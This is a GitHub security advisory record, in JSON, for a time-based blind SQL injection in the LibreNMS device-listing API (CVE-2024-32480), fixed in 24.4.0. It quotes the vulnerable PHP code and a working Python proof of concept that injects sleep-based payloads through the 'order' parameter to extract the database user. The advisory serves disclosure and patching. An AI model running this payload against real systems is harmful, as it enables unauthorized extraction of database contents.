{
  "Severity": "HIGH",
  "UpdatedAt": "2024-04-22T18:37:36Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "librenms/librenms"
  },
  "Advisory": {
    "DatabaseId": 242640,
    "Id": "GSA_kwCzR0hTQS1qaDU3LWozdnEtaDQzOM4AA7PQ",
    "GhsaId": "GHSA-jh57-j3vq-h438",
    "References": [
      {
        "Url": "https://github.com/librenms/librenms/security/advisories/GHSA-jh57-j3vq-h438"
      },
      {
        "Url": "https://github.com/librenms/librenms/commit/83fe4b10c440d69a47fe2f8616e290ba2bd3a27c"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-32480"
      },
      {
        "Url": "https://github.com/advisories/GHSA-jh57-j3vq-h438"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-jh57-j3vq-h438"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-32480"
      }
    ],
    "Description": "### Summary\nGet a valid API token, make sure you can access api functions, then replace string on my PoC code, Test on offical OVA image, it's a old version 23.9.1, but this vulerable is also exists on latest version 24.2.0\n\n### Details\nin file `api_functions.php`, line 307 for function list_devices\n\n```php\n$order = $request-\u003eget('order');\n    $type = $request-\u003eget('type');\n    $query = $request-\u003eget('query');\n    $param = [];\n\n    if (empty($order)) {\n        $order = 'hostname';\n    }\n\n    if (stristr($order, ' desc') === false \u0026\u0026 stristr($order, ' asc') === false) {\n        $order = 'd.`' . $order . '` ASC';\n    }\n    /* ... */\n    $devices = [];\n    $dev_query = \"SELECT $select FROM `devices` AS d $join WHERE $sql GROUP BY d.`hostname` ORDER BY $order\";\n    foreach (dbFetchRows($dev_query, $param) as $device) {\n```\nThe \"order\" parameter is obtained from $request. After performing a string check, the value is directly incorporated into an SQL statement and concatenated, resulting in a SQL injection vulnerability.\n\n### PoC\nFor example. this PoC is get current db user\n```python\nimport string\nimport requests\n\nheaders = {\n\t'X-Auth-Token': 'token_string'\n}\nreq = requests.Session()\npayloads = '_-@.,' + string.digits + string.ascii_letters\nurl = 'http://host/api/v0/devices?order=device_id` and if(ascii(substr(user(),%d,1))=%d,sleep(5),1) and d.`device_id'\nresult = 'user: '\nfor i in range(10):\n\tfor payload in payloads:\n\t\ttry:\n\t\t\treq.get(url % (i+1, ord(payload)), headers=headers, timeout=3)\n\t\texcept requests.exceptions.ReadTimeout as ex:\n\t\t\tresult += payload\n\t\t\tprint(result),\n\t\texcept Exception as e:\n\t\t\tpass\n```\n![QQ截图20240306181404](https://github.com/librenms/librenms/assets/11938870/017cc413-ce1e-45a2-b0f1-a0ae83bbbeee)\n\n### Impact\nAttacker can extract whole database",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-04-22T18:37:35Z",
    "Severity": "HIGH",
    "Summary": "LibreNMS vulnerable to a Time-Based Blind SQL injection leads to database extraction",
    "UpdatedAt": "2024-04-23T14:15:50Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.2,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "24.4.0"
      },
      "VulnerableVersionRange": "\u003c 24.4.0"
    }
  ]
}